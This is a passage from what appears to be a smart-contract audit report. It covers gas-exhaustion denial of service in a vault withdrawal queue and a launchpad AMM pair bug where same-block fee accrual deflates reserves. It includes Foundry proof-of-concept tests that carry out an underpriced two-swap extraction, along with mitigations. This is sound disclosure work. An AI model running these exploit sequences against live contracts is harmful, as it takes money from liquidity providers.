        uint256 gasStart2 = gasleft();
        g2.cancelWithdrawal(id2);
        uint256 gasUsed2 = gasStart2 - gasleft();

        // Expect meaningfully higher gas for larger queue (demonstrates O(n))
        assertTrue(gasUsed2 > gasUsed1 + 30_000, "gas should scale with queue length");
    }

    // Show that processWithdrawals will OOG for large queues due to _dequeueBatch copying full array
    function test_processWithdrawals_can_OOG_on_large_queue() public {
        GTL g = _newVault();
        uint256 entries = 8_000; // moderate size to keep test time reasonable
        _buildQueue(g, entries);

        // Ensure vault has enough USDC to not fail on transfer
        usdc.mint(address(g), 1_000_000);

        // Owner (admin) tries to process 1 withdrawal with a low gas stipend; the full-array copy in _dequeueBatch should exhaust gas
        bytes memory data = abi.encodeWithSignature("processWithdrawals(uint256)", 1);
        vm.prank(owner);
        (bool ok, ) = address(g).call{gas: 1_000_000}(data);
        assertFalse(ok, "processWithdrawals should fail due to gas exhaustion on large queues");
    }
}


## Suggested Mitigation
Eliminate full-array rebuilds/slices. Two practical designs:
- Swap-and-pop with id index mapping for arbitrary removals, plus a head pointer for front pops:
  • mapping(uint256=>uint256) idIndex; uint256[] queue; uint256 head;
  • Enqueue: idIndex[id] = queue.length; queue.push(id).
  • Cancel(id): idx = idIndex[id]; last = queue[queue.length-1]; queue[idx] = last; idIndex[last] = idx; queue.pop(); delete idIndex[id]. This is O(1) and does not rely on order among non-front items.
  • Process front ‘num’: increment head by num (no copy). Periodically compact when head crosses a threshold (e.g., if head > 1024 && head*2 > queue.length) by rewriting queue = queue[head:], resetting head to 0, and rebuilding idIndex for remaining items. This compaction is infrequent and bounded by config, preventing unbounded gas in normal flows.
- Alternatively, implement a ring buffer (fixed or auto-resizing) with head/tail indices; cancel uses idIndex swap-with-tail; processing advances head without copying. Both approaches avoid O(n) memory/storage copies per operation.
Also consider adding a reasonable per-account maximum outstanding withdrawals or minimum per-withdrawal share size to deter spam.





 **Derived From** : If the tx emits LaunchpadFeesAccrued(f0,f1), then accruedLaunchpadFee0_post == accruedLaunchpadFee0_pre + f0 && accruedLaunchpadFee1_post == accruedLaunchpadFee1_pre + f1

## [H-16]. Same-block accrual shrinks stored reserves (k) enabling underpriced second swap to extract value

## Derived From Pattern/Invariant
If the tx emits LaunchpadFeesAccrued(f0,f1), then accruedLaunchpadFee0_post == accruedLaunchpadFee0_pre + f0 && accruedLaunchpadFee1_post == accruedLaunchpadFee1_pre + f1

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.swap

## Minimim Privilege Required
Permissionless

## Description
In GTELaunchpadV2Pair._update(), when timeElapsed == 0 (same block) it does not distribute fees; instead it accumulates them into accruedLaunchpadFee{i} and sets reserves to uint112(balance{i}) - totalLaunchpadFee{i}. This makes stored reserves smaller than actual balances because the accrued fees are still physically in the pair. The next swap in the same block reads these lowered reserves via getReserves() and verifies the constant-product inequality against the reduced k = reserve0 * reserve1, while LHS uses actual balances. As a result, the inequality is easier to satisfy and the attacker can request a larger output for a smaller input than the true AMM price would allow. This violates the state machine invariant around valid reserve/k transitions in a single block and results in a permissionless value extraction path. Vulnerable snippet (emphasis):

function _update(..., uint112 newLaunchpadFee0, uint112 newLaunchpadFee1) private {
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    uint32 timeElapsed = blockTimestamp - blockTimestampLast;
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) { ... distribute ... }
    else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        // SAME-BLOCK ACCRUAL
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    // Reserves are reduced by total fees, but tokens remain in balance
    reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;
    reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;
}

A two-swap-in-one-transaction (same block) sequence artificially deflates k before the second swap. The second swap then passes the UniswapV2 K-check against the lowered k and extracts extra output (or underpays input), creating MEV-style profit. A swap immediately followed by sync() in the same block keeps reserves depressed and further amplifies the effect for the next same-block swap.

## Impact
Attacker underpays for output (or over-extracts output) by exploiting k computed from deflated reserves within the same block, leading to direct, permissionless monetary loss for LPs/pool.

## Proof of Concept
Preconditions: launchpadFeeDistributor != 0, rewardsPoolActive > 0, and launchpadLp holds the LP tokens (as in production), so _getLaunchpadFees returns a non-zero share. Same-block sequence:
- Step 1 (prime same block): Attacker swaps with a large amount1In and tiny amount0Out (e.g., amount0Out = 1). Because timeElapsed == 0, _update accrues launchpad fees (≈ 0.1% of amount1In weighted by LP share) and sets stored reserves to reserve{i} = balance{i} - totalAccrued{i}. The accrued tokens physically remain in the pair, so stored reserves become lower than true balances.
- Step 2 (still same block): Attacker chooses a modest amount1In2 and requests amount0Out2 tuned between the two prices computed by the Uniswap-V2 k-check: one using depressed reserves (R_dep) and one using true reserves (R_true = R_dep + accrued). The contract’s k-check references R_dep on the RHS but uses actual balances on the LHS, so the inequality is easier to satisfy. The swap succeeds for an amount0Out2 that would fail if the RHS used R_true.
- Result: The attacker extracts more output (or underpays) than the fair AMM price, causing direct LP value loss within a single block.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public immutable decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s){name=n;symbol=s;}
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool){ require(balanceOf[msg.sender] >= amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function approve(address sp, uint256 amt) external returns (bool){ allowance[msg.sender][sp]=amt; return true; }
    function transferFrom(address f,address t,uint256 a) external returns (bool){ require(balanceOf[f]>=a && allowance[f][msg.sender]>=a, "tf"); balanceOf[f]-=a; allowance[f][msg.sender]-=a; balanceOf[t]+=a; return true; }
}

contract MockFactory {
    function createPair(address t0, address t1, address lp, address dist) external returns (GTELaunchpadV2Pair) {
        GTELaunchpadV2Pair p = new GTELaunchpadV2Pair();
        p.initialize(t0, t1, lp, dist);
        return p;
    }
    function feeTo() external view returns (address) { return address(0); }
}

contract SameBlockAccrualExploitTest is Test {
    MockERC20 t0; MockERC20 t1; GTELaunchpadV2Pair pair; MockFactory factory;
    address attacker = address(0xBEEF);
    address lpVault = address(0xA11CE);
    address distributor = address(0xD1STR1B);

    function setUp() public {
        t0 = new MockERC20("T0","T0");
        t1 = new MockERC20("T1","T1");
        factory = new MockFactory();
        pair = factory.createPair(address(t0), address(t1), lpVault, distributor);

        // Seed initial liquidity
        t0.mint(address(this), 10_000_000 ether);
        t1.mint(address(this), 10_000_000 ether);
        t0.transfer(address(pair), 1_000 ether);
        t1.transfer(address(pair), 1_000 ether);
        pair.mint(address(this));

        // Move all LP to launchpadLp so fee share ≈ 100%
        uint256 lpBal = pair.balanceOf(address(this));
        pair.transfer(lpVault, lpBal);

        // Fund attacker
        t1.mint(attacker, 2_000_000 ether);
    }

    function _outGivenIn(uint256 R0, uint256 R1, uint256 amount1In) internal pure returns (uint256) {
        // Uniswap V2 formula with 0.3% fee on input: out0 = in1*997*R0 / (R1*1000 + in1*997)
        uint256 num = amount1In * 997 * R0;
        uint256 den = (R1 * 1000) + (amount1In * 997);
        return num / den;
    }

    function test_KCheckSoftenedBySameBlockAccrual() public {
        // STEP 1 (same block): large input to accrue sizable launchpad fees; tiny output
        uint256 primeIn = 1_000_000 ether; // accrual ≈ 0.1% => ~1,000 ether
        vm.startPrank(attacker);
        t1.transfer(address(pair), primeIn);
        pair.swap(1 ether, 0, attacker, ""); // tiny out to trigger accounting

        // Observe depressed reserves and accrued fees
        (uint112 r0DepU, uint112 r1DepU,) = pair.getReserves();
        (uint112 acc0U, uint112 acc1U,) = pair.getAccruedLaunchpadFees();
        uint256 r0Dep = uint256(r0DepU);
        uint256 r1Dep = uint256(r1DepU);
        uint256 acc0 = uint256(acc0U);
        uint256 acc1 = uint256(acc1U);
        uint256 r0True = r0Dep + acc0; // effective true reserves (tokens are still in the pair)
        uint256 r1True = r1Dep + acc1;
        assertGt(acc1, 0, "need non-zero accrued fee");

        // STEP 2 (same block): choose in and ask an out that passes vs depressed reserves but fails vs true reserves
        uint256 in2 = 10_000 ether;
        uint256 outDep = _outGivenIn(r0Dep, r1Dep, in2);
        uint256 outTrue = _outGivenIn(r0True, r1True, in2);
        assertGt(outDep, outTrue, "depressed reserves must allow strictly larger out");

        uint256 askOut = outTrue + 1; // 1 wei more than true limit
        require(askOut < r0Dep, "ask must be < reserve0 for liquidity check");

        // Perform the underpriced second swap
        t1.transfer(address(pair), in2);
        pair.swap(askOut, 0, attacker, ""); // succeeds because RHS uses depressed reserves
        vm.stopPrank();

        // Reconstruct the step-2 K-check against TRUE reserves to show it would have failed
        uint256 bal0 = t0.balanceOf(address(pair)); // post-swap balance0 = r0True - askOut
        uint256 bal1 = t1.balanceOf(address(pair)); // post-swap balance1 = r1True + in2
        // Inputs as swap computes them using PRIOR depressed reserves
        uint256 amt0In = bal0 > (r0Dep - askOut) ? bal0 - (r0Dep - askOut) : 0; // expected 0
        uint256 amt1In = bal1 - (r1Dep);
        uint256 bal0Adj = bal0 * 1000 - amt0In * 3;
        uint256 bal1Adj = bal1 * 1000 - amt1In * 3;
        uint256 lhs = bal0Adj * bal1Adj;
        uint256 rhsTrue = r0True * r1True * (1000**2);
        assertLt(lhs, rhsTrue, "Swap would violate K if true reserves were used");
    }
}


## Suggested Mitigation
The core bug is subtracting undistributed accrued fees from stored reserves while the tokens remain in the contract. This lowers reserve0/reserve1 used on the RHS of the k-check within the same block, but the LHS still uses full balances, softening the invariant.
Recommended fixes (pick one and apply consistently):
- Preferred: Keep reserve0/reserve1 equal to actual balances at all times. Track accruedLaunchpadFee{i} separately and never subtract it from reserves. When distributing (timeElapsed > 0), transfer tokens out and then set reserves to the new balances (no fee subtraction). skim() should continue to use (reserve + accrued) to compute true excess if needed, or simply transfer zero when balances equal reserves.
- Alternative: If you must continue tracking reserves net of accrued fees for other flows, then perform the swap k-check against effective reserves that add back the undistributed fees: use (_reserve0 + accruedLaunchpadFee0) and (_reserve1 + accruedLaunchpadFee1) in the RHS product. This preserves the invariant even in same-block accrual.
- In all cases, avoid any state where reserves != balances − actually transferred-out fees. Never reduce reserves by amounts that are still physically in the contract.



